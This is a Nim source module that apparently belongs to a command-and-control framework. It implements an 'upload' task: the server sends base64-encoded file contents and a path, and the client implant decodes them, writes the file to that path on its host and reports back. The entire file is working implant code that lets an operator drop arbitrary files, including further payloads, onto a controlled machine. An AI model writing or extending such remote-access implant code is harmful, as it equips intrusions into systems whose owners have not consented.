when defined(server):
  import asyncdispatch, json
  import ../server/[types, communication]

when defined(client):
  import net, base64
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client, path: string, contents: string #[base64'd]#): Future[Task] {.async.} =
    return await client.sendClientTask("upload", %*{ "contents": contents, "path": path })

when defined(client):
  proc executeTask*(client: Socket, taskId: int, contents: string, path: string) =
    let fileContents = decode(contents)
    writeFile(path, fileContents)
    client.sendOutput(taskId, "upload", "received file " & path & " (length: " & $len(fileContents) & ")")